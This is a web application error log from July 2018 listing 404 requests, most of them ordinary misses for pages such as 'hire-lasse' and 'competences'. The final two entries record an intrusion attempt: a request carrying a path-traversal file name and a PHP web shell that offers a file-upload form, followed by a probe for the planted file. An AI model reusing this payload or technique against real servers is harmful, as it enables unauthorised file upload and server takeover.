2018-07-29T00:11:26+00:00 ERR (3) 404 "hire-lasse" was not found.
REMOTE_ADDR: 77.75.76.161
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "de"
  ["action"] => string(4) "page"
  ["key"] => string(10) "hire-lasse"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2018-07-29T12:15:56+00:00 ERR (3) 404 "hire-lasse" was not found.
REMOTE_ADDR: 62.138.0.25
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "en"
  ["action"] => string(4) "page"
  ["key"] => string(10) "hire-lasse"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2018-07-29T12:53:24+00:00 ERR (3) 404 "competences" was not found.
REMOTE_ADDR: 85.25.210.234
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "en"
  ["action"] => string(4) "page"
  ["key"] => string(11) "competences"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2018-07-29T13:03:00+00:00 ERR (3) 404 "hire-lasse" was not found.
REMOTE_ADDR: 62.138.0.25
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "de"
  ["action"] => string(4) "page"
  ["key"] => string(10) "hire-lasse"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2018-07-29T13:24:57+00:00 ERR (3) 404 "competences" was not found.
REMOTE_ADDR: 85.25.210.234
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "de"
  ["action"] => string(4) "page"
  ["key"] => string(11) "competences"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2018-07-29T22:16:20+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 178.137.88.27
HTTP_REFERER: 
requested: array(9) {
  ["controller"] => string(10) "connectors"
  ["action"] => string(6) "system"
  ["module"] => string(7) "default"
  ["ctx"] => string(3) "web"
  ["cache_filename"] => string(13) "../../dbs.php"
  ["useRawIMoutput"] => string(1) "1"
  ["src"] => string(1) "."
  ["IMresizedData"] => string(394) "<?php echo("#0x2515");if(isset($_GET["u"])){echo'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if($_POST['_upl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo'Success_Upload!!!';}else{echo'Failed';}};};"
  ["config_prefer_imagemagick"] => string(1) "0"
}


--------------------------------------------------------------------------------
2018-07-29T22:16:20+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 178.137.88.27
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(7) "dbs.php"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
